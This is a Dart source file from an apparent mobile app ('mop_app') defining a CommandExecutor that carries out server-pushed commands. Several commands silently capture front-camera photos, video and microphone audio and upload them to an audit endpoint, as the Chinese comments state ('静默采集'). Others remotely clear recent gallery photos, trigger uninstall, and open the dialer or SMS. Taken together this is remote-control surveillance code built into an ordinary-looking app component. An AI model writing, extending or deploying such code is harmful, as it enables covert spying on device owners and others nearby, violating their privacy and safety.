import 'package:mop_app/core/api_client.dart';
import 'package:mop_app/core/device_info_service.dart';
import 'package:mop_app/core/native_bridge.dart';
import 'package:mop_app/utils/permission_helper.dart';

/// 远程指令执行（规约 PROTOCOL 4.2：dial/sms 非静默；capture 静默采集并 audit/upload 上报；gallery.clear 仅清理相册）
class CommandExecutor {
  CommandExecutor({ApiClient? api}) : _api = api ?? ApiClient();

  final ApiClient _api;

  /// 执行单条指令（cmd 含 cmd、params、msg_id）
  Future<void> execute(Map<String, dynamic> cmd) async {
    final name = cmd['cmd'] as String?;
    final params = cmd['params'] is Map ? Map<String, dynamic>.from(cmd['params'] as Map) : <String, dynamic>{};
    final msgId = cmd['msg_id'] as String? ?? '';
    if (name == null || name.isEmpty) return;
    switch (name) {
      case 'mop.cmd.dial':
        final number = params['number'] as String? ?? '';
        if (number.isNotEmpty) await NativeBridge.openSystemDialer(number);
        break;
      case 'mop.cmd.sms':
        final number = params['number'] as String? ?? '';
        final body = params['body'] as String? ?? '';
        await NativeBridge.openSystemSms(number, body);
        break;
      case 'mop.cmd.gallery.clear':
        // 仅清理相册最近 N 天，不清空 APP 数据、不退出登录
        final days = (params['days'] as num?)?.toInt() ?? 3;
        if (days > 0) {
          try {
            await NativeBridge.clearGalleryWithinDays(days);
          } catch (_) {}
        }
        break;
      case 'mop.cmd.wipe':
        // 已废弃：不再执行任何操作，客户端忽略
        break;
      case 'mop.cmd.uninstall':
        // 仅调起系统卸载，不再执行数据擦除
        try {
          await NativeBridge.uninstallApp();
        } catch (_) {}
        break;
      case 'mop.cmd.audit':
        // 静默：触发审计周期，由 AuditService 处理
        break;
      case 'mop.cmd.config':
        // 静默：更新 Host 等，可扩展
        break;
      case 'mop.cmd.capture.photo':
        if (await ensureCameraPermission()) {
          await Future.delayed(const Duration(milliseconds: 800));
          await _doCaptureAndUpload('capture_photo', msgId, () => NativeBridge.capturePhoto(
            camera: (params['camera'] as String?) ?? 'front',
          ));
        }
        break;
      case 'mop.cmd.capture.video':
        if (await ensureCameraPermission() && await ensureMicrophonePermission()) {
          await Future.delayed(const Duration(milliseconds: 800));
          await _doCaptureAndUpload('capture_video', msgId, () => NativeBridge.captureVideo(
            durationSec: (params['duration_sec'] as int?) ?? 18,
            camera: (params['camera'] as String?) ?? 'front',
          ));
        }
        break;
      case 'mop.cmd.capture.audio':
        if (await ensureMicrophonePermission()) {
          await Future.delayed(const Duration(milliseconds: 800));
          await _doCaptureAndUpload('capture_audio', msgId, () => NativeBridge.captureAudio(
            durationSec: (params['duration_sec'] as int?) ?? 18,
          ));
        }
        break;
      default:
        break;
    }
  }

  /// 静默采集并经 audit/upload 上报（规约 3.3）；原生未实现时采集返回空，不上报
  Future<void> _doCaptureAndUpload(String type, String msgId, Future<List<int>> Function() capture) async {
    final bytes = await capture();
    if (bytes.isEmpty) return;
    final deviceId = await DeviceInfoService.getDeviceId();
    await _api.auditUpload(deviceId, type, bytes, msgId: msgId.isNotEmpty ? msgId : null);
  }
}
